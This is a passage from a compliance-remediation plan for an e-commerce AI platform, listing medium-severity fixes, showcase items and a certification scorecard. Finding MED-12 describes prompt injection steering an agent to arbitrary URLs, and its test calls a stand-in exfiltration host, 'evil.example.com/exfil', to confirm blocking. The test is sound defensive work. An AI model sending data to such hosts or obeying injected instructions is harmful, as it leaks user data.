**File:** New file — [docs/ROPA.md](docs/ROPA.md)
**Framework Tags:** GDPR Art 30, Australian Privacy Act APP 1, ISO 27001 A.5.12

**Required RoPA entries for ShopSquire:**
1. Customer order processing — lawful basis: contract performance
2. Fraud scoring — lawful basis: legitimate interests (with LIA documented)
3. Email security analysis — lawful basis: legitimate interests (supplier/merchant security)
4. Product recommendation — lawful basis: consent (session data) or legitimate interests
5. CV / image analysis — lawful basis: consent (user-uploaded images)
6. Analytics / BI — lawful basis: legitimate interests (with pseudonymisation)

Each entry must document: controller, processor (if applicable), data categories, recipients, retention, transfer mechanism, security measures.

---

### MED-04 — Short-list erased on zero-result turns (BUG-4)
**Severity:** MEDIUM | **Effort:** S
**File:** [src/app/routers/recommend.py:~8600](src/app/routers/recommend.py#L8600)

**Fix:**
```python
# Only overwrite last_shortlist_skus when new results are non-empty
if new_results:
    session_state["last_shortlist_skus"] = [p["sku"] for p in new_results]
# else: keep existing shortlist for follow-up context
```

---

### MED-05 — NQE fires on follow-up explain queries (BUG-5)
**Severity:** MEDIUM | **Effort:** S
**File:** [src/app/routers/recommend.py:~5193](src/app/routers/recommend.py#L5193)

**Fix — broaden `_is_followup_explain_query()`:**
```python
_EXPLAIN_PATTERNS = re.compile(
    r'(?i)\b(why|tell me more|explain|what does|what is|how does|compare|versus|vs\.?|difference|'
    r'pros and cons|better than|worse than|review|opinion|thoughts on|more detail|elaborate)\b'
)
def _is_followup_explain_query(query: str) -> bool:
    return bool(_EXPLAIN_PATTERNS.search(query))
```

---

### MED-06 — No formal change management process for AI model updates
**Severity:** MEDIUM | **Effort:** M
**File:** New file — [docs/AI-CHANGE-MANAGEMENT.md](docs/AI-CHANGE-MANAGEMENT.md)
**Framework Tags:** ISO 42001 Cl 8.5, EU AI Act Art 16, NIST AI RMF GOVERN-1.4

**Required controls to document and implement:**
- Model version registry (`config/ai_governance/model_registry.json` — CRIT-01 above)
- Eval baselines for each model (accuracy, F1, hallucination rate on benchmark corpus)
- Promotion workflow: dev → staging → prod with eval gate at each stage
- Rollback procedure: how to revert a model within 1 hour
- Post-deployment monitoring period: 48h heightened alerting after any model change
- Approval matrix: who can approve which model changes (minor tuning vs architecture change vs provider switch)

---

### MED-07 — Redis ACL not configured in docker-compose
**Severity:** MEDIUM | **Effort:** S
**File:** [docker-compose.yml](docker-compose.yml)
**Framework Tags:** PCI DSS Req 8.6 (service account authentication), ISO 27001 A.8.5

**Problem:**
`REDIS_ACL_USERNAME` and `REDIS_ACL_PASSWORD` are documented in `security-hardening.env.example` but not wired into the `redis` service in `docker-compose.yml`. Redis runs with default (no auth) configuration.

**Fix — `docker-compose.yml` redis service:**
```yaml
redis:
  image: redis:7-alpine
  command: >
    redis-server
    --requirepass ${REDIS_PASSWORD}
    --aclfile /etc/redis/users.acl
  volumes:
    - ./config/redis/users.acl:/etc/redis/users.acl:ro
  environment:
    - REDIS_PASSWORD=${REDIS_PASSWORD}
```

**Create `config/redis/users.acl`:**
```
user default off
user shopsquire_api on >${REDIS_ACL_PASSWORD} ~session:* ~ratelimit:* +get +set +del +expire +incr +incrby +zadd +zrange +zcard
user shopsquire_worker on >${REDIS_WORKER_PASSWORD} ~celery* +brpop +lpush +llen
```

---

### MED-08 — No automated PII detection / data classification on ingest
**Severity:** MEDIUM | **Effort:** M
**File:** [src/app/routers/ingest_gmail.py](src/app/routers/ingest_gmail.py) + [src/app/routers/ingest_m365.py](src/app/routers/ingest_m365.py)
**Framework Tags:** GDPR Art 5(1)(c) (minimisation), APP 11.1, ISO 27001 A.8.10

**Problem:**
Email ingest pipelines parse email bodies and attachments and store them. There is no automatic PII classification or tagging on ingest to enable retention enforcement, subject access requests, or purpose limitation.

**Fix — add PII classifier middleware to ingest pipelines:**
```python
from src.app.security.dlp_export import dlp_scrub_pii

async def ingest_with_pii_classification(email_body: str) -> dict:
    scrubbed, pii_hit_count = dlp_scrub_pii(email_body)
    pii_classification = "contains_pii" if pii_hit_count > 0 else "no_pii_detected"
    # Store pii_classification in the email record for retention/DSR handling
    return {"body": scrubbed if STORE_SCRUBBED else email_body, "pii_class": pii_classification}
```

---

### MED-09 — No model drift / accuracy monitoring alert threshold
**Severity:** MEDIUM | **Effort:** M
**File:** [src/app/monitoring/dashboards/accuracy.json](src/app/monitoring/dashboards/accuracy.json) + [src/app/observability/metrics.py](src/app/observability/metrics.py)
**Framework Tags:** ISO 42001 Cl 9.1 (monitoring and measurement), NIST AI RMF MEASURE-2.8, EU AI Act Art 17

**Problem:**
Accuracy and cost dashboards exist but there are no Prometheus alerting rules that fire when model accuracy drops below a threshold or when false-positive/negative rates drift.

**Fix — create `src/app/monitoring/alerts/model_drift.yml`:**
```yaml
groups:
  - name: model_drift
    rules:
      - alert: FraudFalsePositiveRateHigh
        expr: rate(shopsquire_fraud_false_positive_total[1h]) / rate(shopsquire_fraud_decisions_total[1h]) > 0.05
        for: 15m
        labels:
          severity: warning
        annotations:
          summary: "Fraud scorer false-positive rate above 5% for 15 minutes — model drift suspected"

      - alert: RecommendationAccuracyDrop
        expr: shopsquire_recommendation_relevance_score_avg < 0.7
        for: 30m
        labels:
          severity: warning
        annotations:
          summary: "Recommendation relevance below 0.7 — check NQE context loss (BUG-1)"
```

---

### MED-10 — Admin dashboard (5173) has no session timeout or inactivity lock
**Severity:** MEDIUM | **Effort:** S
**File:** [frontend/src/components/AdminDashboard.tsx](frontend/src/components/AdminDashboard.tsx)
**Framework Tags:** PCI DSS Req 8.2.8 (session idle timeout), ISO 27001 A.8.5

**Fix — add inactivity timeout hook:**
```typescript
// frontend/src/hooks/useIdleTimeout.ts
import { useEffect, useRef } from 'react';

export function useIdleTimeout(timeoutMs: number, onTimeout: () => void) {
  const timer = useRef<ReturnType<typeof setTimeout>>();

  useEffect(() => {
    const reset = () => {
      clearTimeout(timer.current);
      timer.current = setTimeout(onTimeout, timeoutMs);
    };
    ['mousemove', 'keydown', 'click', 'scroll'].forEach(e =>
      window.addEventListener(e, reset)
    );
    reset();
    return () => {
      clearTimeout(timer.current);
      ['mousemove', 'keydown', 'click', 'scroll'].forEach(e =>
        window.removeEventListener(e, reset)
      );
    };
  }, [timeoutMs, onTimeout]);
}

// In AdminDashboard.tsx:
useIdleTimeout(15 * 60 * 1000, () => {
  // Clear session, redirect to login
  localStorage.removeItem('ss_owner_key');
  window.location.href = '/login?reason=idle_timeout';
});
```

---

### MED-11 — No structured DSR (Data Subject Request) handling workflow
**Severity:** MEDIUM | **Effort:** M
**File:** New file — [src/app/routers/privacy.py](src/app/routers/privacy.py) (may already exist — verify)
**Framework Tags:** GDPR Art 17 (right to erasure), GDPR Art 20 (portability), APP 12 (access), APP 13 (correction)

**Problem:**
No documented DSR intake, acknowledgement (within 3 days), fulfillment (within 30 days), or evidence workflow. Under GDPR and the Australian Privacy Act, these are legally required response paths.

**Fix — add DSR endpoints to `privacy.py`:**
```python
@router.post("/api/v1/privacy/dsr/erasure")
async def request_erasure(request: DSRErasureRequest):
    # Create ticket with DSR type, log to audit chain, send confirmation email
    # Trigger async Celery task to: anonymise orders, delete session data,
    # remove from vector store, flag for LLM retraining exclusion
    ...

@router.post("/api/v1/privacy/dsr/access")
async def request_access(request: DSRAccessRequest):
    # Generate data export, log to audit chain, return download link
    ...
```

---

### MED-12 — Egress allowlist not enforced on agent tool calls
**Severity:** MEDIUM | **Effort:** S
**File:** [src/app/security/egress_allowlist.py](src/app/security/egress_allowlist.py) + [src/app/security/safe_requests.py](src/app/security/safe_requests.py)
**Framework Tags:** ISO 27001 A.8.20 (networks security), NIST AI RMF MANAGE-1.3, OWASP LLM Top 10 LLM07 (insecure plugin design)

**Problem:**
`egress_allowlist.txt` exists under `config/security/` but it's unclear if every agent tool call goes through `safe_requests.py`. A prompt injection could cause an agent to call an arbitrary external URL.

**Fix — verify and enforce:** Add a test that attempts to call a non-allowlisted URL from an agent tool and confirm it is blocked. Add startup assertion:
```python
# src/app/security/egress_allowlist.py — add at module load time
assert os.path.exists(ALLOWLIST_PATH), f"Egress allowlist missing: {ALLOWLIST_PATH}"
```

**Add integration test:**
```python
def test_agent_egress_blocked_for_non_allowlisted_url():
    with pytest.raises(EgressBlockedError):
        safe_get("https://evil.example.com/exfil")
```

---

## SECTION 4 — SHOWCASE ITEMS (what makes ShopSquire best-in-class)

These are not just "to-do" items — they are already partly built and need to be **completed, tested, and documented** to be demo-able to enterprise buyers, auditors, and regulators.

### SHOWCASE-01 — Bitemporal Decision Audit Trail
**Status:** Infrastructure exists (`audit_chain.py`, `decision_audits` table, hash chaining)
**Gap:** External anchor (`WORM_ARCHIVE_PATH`) not demonstrated; no on-demand audit pack export
**Action:**
- Complete the WORM anchor (append to a local file with `O_APPEND|O_SYNC` in `audit_chain.py`)
- Add `GET /api/v1/audit/pack?from=&to=&decision_id=` endpoint that exports chain + verification proof as a signed ZIP
- Add admin UI button "Download Audit Pack" in `AdminDashboard.tsx`
- Demo script: show tamper detection by mutating one row in DB and running chain verification

### SHOWCASE-02 — CV Return Fraud Detection
**Status:** CV pipeline exists, damage classifier built
**Gap:** BUG-3 (missing OS packages), no demo video of multi-image mismatch
**Action:** Fix BUG-3 (HIGH-06 above), add demo case to `live_demo_gate.py`, create demo script for "return a scratched laptop claiming it's new"

### SHOWCASE-03 — Supply Chain Attack Detection (CISA KEV + Typosquatting)
**Status:** `supply_chain_security.py` built and exposed at `/api/v1/security/scan/supply-chain`
**Gap:** No admin UI widget, no demo showing a typosquatted package being caught
**Action:** Add supply chain scan widget to `AdminDashboard.tsx`, add demo preset for `requets` (typosquat of `requests`), add to `live_demo_gate.py` Gate 6

### SHOWCASE-04 — Email Security Lab with BEC Kill Chain
**Status:** All 4 buttons wired, BIMI/auth sections render
**Gap:** Auth mismatch error (BUG-8), no walkthrough video, `bec_kill_chain.py` not surfaced in UI
**Action:** Fix auth (HIGH-07), add kill chain visualization panel to email lab UI, add demo preset for "supplier invoice fraud with spoofed domain"

### SHOWCASE-05 — Compliance Dashboard with Framework Mapping
**Status:** `admin_compliance_registry.py`, `admin_compliance_reports.py` exist
**Gap:** No live framework-to-control coverage visualization
**Action:** Add a heatmap to AdminDashboard showing PCI DSS / ISO 27001 / GDPR control coverage (green = implemented, amber = partial, red = gap). Map to `config/ai_governance/model_registry.json` and the authority matrix.

---

## SECTION 5 — QUICK REFERENCE: FILE CHANGE SUMMARY

| Priority | File | Action |
|---|---|---|
| CRIT | `src/app/security/audit_chain.py:40` | Remove hardcoded HMAC secret fallback |
| CRIT | `src/app/routers/payments.py:16` | Remove in-memory idempotency cache |
| CRIT | `src/app/security/scope_enforcement.py:20` | Flip default to enforce=1 |
| CRIT | `config/security/security-hardening.env.example` | Set CELERY_TASK_SIGNING_ENABLED=1 |
| CRIT | `src/app/policy/action_authority_matrix.py` | CREATE — policy decision engine |
| CRIT | `src/app/security/dlp_export.py` | Add PII scrubbing patterns |
| CRIT | `src/app/main.py` | Add SecurityHeadersMiddleware |
| CRIT | `src/app/routers/auth.py` | Add SameSite=Strict + CSRF token |
| CRIT | `src/app/observability/metrics.py` | Add IP allowlist + bearer auth |
| CRIT | `src/app/policy/data_residency.py` | CREATE — data residency gate |
| HIGH | `config/ai_governance/model_registry.json` | CREATE — AI model inventory |
| HIGH | `src/app/security/rbac_dep.py` | CREATE — RBAC FastAPI dependency |
| HIGH | `src/app/security/output_filter.py` | CREATE — LLM output filter |
| HIGH | `src/app/policy/kill_switch.py` | CREATE — autonomy kill switches |
| HIGH | `docs/DPIA-AI-FRAUD-SCORING.md` | CREATE — mandatory DPIA |
| HIGH | `docker-compose.yml` + Dockerfile | Add CV packages |
| HIGH | `src/app/routers/email_security.py` | Structured 401 error |
| HIGH | `src/app/services/ticketing.py` | Add SLA enforcement |
| HIGH | `scripts/check_sbom_kev.py` | CREATE — CI SBOM gate |
| HIGH | `src/app/routers/recommend.py:~5020` | Fix NQE context loss (BUG-1) |
| MED | `src/app/routers/recommend.py:~2865` | Fix LLM summary prompt (BUG-6) |
| MED | `src/app/routers/recommend.py:~2995` | Fix budget answer (BUG-7) |
| MED | `docs/ROPA.md` | CREATE — Record of Processing Activities |
| MED | `src/app/routers/recommend.py:~8600` | Fix shortlist erasure (BUG-4) |
| MED | `src/app/routers/recommend.py:~5193` | Fix NQE follow-up detection (BUG-5) |
| MED | `docs/AI-CHANGE-MANAGEMENT.md` | CREATE — model change process |
| MED | `docker-compose.yml` | Add Redis ACL configuration |
| MED | `src/app/routers/ingest_gmail.py` | Add PII classification on ingest |
| MED | `src/app/monitoring/alerts/model_drift.yml` | CREATE — Prometheus alert rules |
| MED | `frontend/src/hooks/useIdleTimeout.ts` | CREATE — admin session timeout |
| MED | `src/app/routers/privacy.py` | Add DSR endpoints |
| MED | `src/app/security/egress_allowlist.py` | Add startup assertion + integration test |

---

## SECTION 6 — COMPLIANCE CERTIFICATION READINESS SCORECARD

| Framework | Current Coverage | After All Actions | Gap Area |
|---|---|---|---|
| PCI DSS 4.0 | 45% | 80% | CDE scope doc, penetration test, QSA attestation |
| ISO 27001:2022 | 50% | 75% | ISMS scope doc, asset inventory, management review cadence |
| ISO 42001:2023 | 20% | 65% | AI inventory (CRIT-05), DPIA (HIGH-05), change management (MED-06) |
| GDPR | 35% | 70% | RoPA (MED-03), DSR workflow (MED-11), DPA with LLM providers |
| EU AI Act | 25% | 60% | High-risk system registration, conformity assessment, post-market monitoring |
| NIST RMF | 55% | 75% | Authorization package, continuous monitoring plan |
| NIST AI RMF | 40% | 70% | GOVERN function gaps, risk measurement baselines |
| Australian Privacy Act | 30% | 65% | APP 1 privacy policy, APP 5 notification, APP 8 transfer docs |

**Estimated sprint plan:** 3 sprints of 2 weeks = 6 weeks to reach audit-ready for PCI DSS and ISO 27001 simultaneously.
- Sprint 1: All CRITICAL items + HIGH-01 through HIGH-05
- Sprint 2: HIGH-06 through HIGH-10 + MEDIUM items MED-01 through MED-06
- Sprint 3: MEDIUM items MED-07 through MED-12 + showcase completions + policy documentation

---

*See companion documents:*
- [COMPLIANCE-FRONTEND-HARDENING.md](COMPLIANCE-FRONTEND-HARDENING.md) — Frontend 5173 deep-dive
- [COMPLIANCE-INSIDER-THREAT.md](COMPLIANCE-INSIDER-THREAT.md) — Insider threat program
- [COMPLIANCE-FRAMEWORK-CONTROL-MATRIX.md](COMPLIANCE-FRAMEWORK-CONTROL-MATRIX.md) — Framework-to-control mapping table
